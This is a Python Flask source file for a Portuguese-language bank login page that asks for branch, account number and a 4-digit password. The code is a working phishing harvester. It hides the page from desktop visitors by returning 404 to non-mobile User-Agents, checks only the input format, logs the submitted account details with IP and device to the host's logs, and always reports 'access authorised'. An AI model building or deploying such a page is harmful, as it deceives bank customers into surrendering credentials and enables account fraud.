from flask import Flask, request, render_template_string, abort
from datetime import datetime
import os

app = Flask(__name__)

HTML_LOGIN = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acesso</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .box {
            background: white;
            padding: 20px;
            border-radius: 8px;
            width: 100%;
            max-width: 360px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin-top: 10px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 12px;
            margin-top: 15px;
            background: red;
            color: white;
            border: none;
            font-size: 16px;
            cursor: pointer;
        }
        .erro {
            color: red;
            margin-top: 10px;
            font-size: 14px;
        }
    </style>

    <script>
        function formatarConta(input) {
            let valor = input.value.replace(/\\D/g, '');

            if (valor.length > 6) {
                valor = valor.slice(0, 6);
            }

            if (valor.length > 5) {
                input.value = valor.slice(0, 5) + '-' + valor.slice(5);
            } else {
                input.value = valor;
            }
        }
    </script>
</head>
<body>
    <div class="box">
        <h2>Acessar</h2>
        <form method="post">
            <input name="agencia" placeholder="Agência (0000)" required maxlength="4" inputmode="numeric">
            <input name="conta" placeholder="Conta (00000-6)" required maxlength="7" inputmode="numeric" oninput="formatarConta(this)">
            <input name="senha" placeholder="Senha (4 dígitos)" type="password" required maxlength="4" inputmode="numeric">
            <button type="submit">ACESSAR</button>
        </form>
        {% if erro %}
        <div class="erro">{{ erro }}</div>
        {% endif %}
    </div>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def login():
    user_agent = request.headers.get('User-Agent', '').lower()

    # PC → 404
    if 'mobile' not in user_agent:
        abort(404)

    erro = None

    if request.method == 'POST':
        agencia = request.form.get('agencia', '')
        conta = request.form.get('conta', '')
        senha = request.form.get('senha', '')

        if not agencia.isdigit() or len(agencia) != 4:
            erro = 'Agência inválida. Informe exatamente 4 números.'

        elif not (len(conta) == 7 and conta[:5].isdigit() and conta[5] == '-' and conta[6].isdigit()):
            erro = 'Conta inválida.'

        elif not senha.isdigit() or len(senha) != 4:
            erro = 'Senha inválida.'

        else:
            # ===== LOG NO RENDER =====
            print("=== NOVO ACESSO ===", flush=True)
            print("Data/Hora:", datetime.now().strftime('%d/%m/%Y %H:%M:%S'), flush=True)
            print("Agência:", agencia, flush=True)
            print("Conta:", conta, flush=True)
            print("Senha: [DIGITADA CORRETAMENTE]", flush=True)
            print("Tamanho da senha:", len(senha), flush=True)
            print("IP:", request.remote_addr, flush=True)
            print("User-Agent:", request.headers.get('User-Agent'), flush=True)
            print("Dispositivo: Mobile", flush=True)
            print("===================", flush=True)


            return "<h2>Acesso autorizado</h2>"

    return render_template_string(HTML_LOGIN, erro=erro)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

